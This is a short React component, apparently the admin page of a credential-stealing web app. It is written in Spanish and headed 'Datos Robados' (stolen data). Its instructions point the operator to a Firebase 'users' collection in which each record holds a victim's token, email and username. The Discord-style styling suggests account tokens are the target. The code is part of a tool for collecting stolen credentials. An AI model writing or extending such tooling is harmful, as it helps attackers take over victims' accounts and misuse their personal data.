import { initializeApp } from "firebase/app";
import { getFirestore, collection, query, orderBy, limit, onSnapshot } from "firebase/firestore";

// Mismas credenciales que en .env.local
const firebaseConfig = {
    apiKey: process.env.VITE_FIREBASE_API_KEY,
    authDomain: process.env.VITE_FIREBASE_AUTH_DOMAIN,
    projectId: process.env.VITE_FIREBASE_PROJECT_ID,
    storageBucket: process.env.VITE_FIREBASE_STORAGE_BUCKET,
    messagingSenderId: process.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
    appId: process.env.VITE_FIREBASE_APP_ID
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

export default function Admin() {
    // Nota: Esto es un componente simple. Para que funcione bien en Vercel, 
    // idealmente deberías usar getServerSideProps, pero para simplicidad:
    
    // En un entorno real, harías fetch a /api/admin para obtener los datos.
    // Aquí te dejo la lógica de cómo se vería la tabla si usas API routes.
    
    return (
        <div style={{background:'#36393f', minHeight:'100vh', padding:'20px', fontFamily:'sans-serif'}}>
            <h1 style={{color:'white'}}>📦 Datos Robados</h1>
            <p style={{color:'#b9bbbe'}}>Ve a <a href="https://console.firebase.google.com" target="_blank" style={{color:'#7289da'}}>Firebase Console</a> para ver la base de datos en tiempo real.</p>
            
            <div style={{marginTop:'20px', background:'#2f3136', padding:'20px', borderRadius:'8px'}}>
                <h3>Instrucciones rápidas:</h3>
                <ol style={{color:'#b9bbbe'}}>
                    <li>Ve a tu consola de Firebase.</li>
                    <li>Busca la colección <code>users</code>.</li>
                    <li>Cada documento contiene el <strong>token</strong>, <strong>email</strong> y <strong>username</strong>.</li>
                </ol>
            </div>
        </div>
    );
}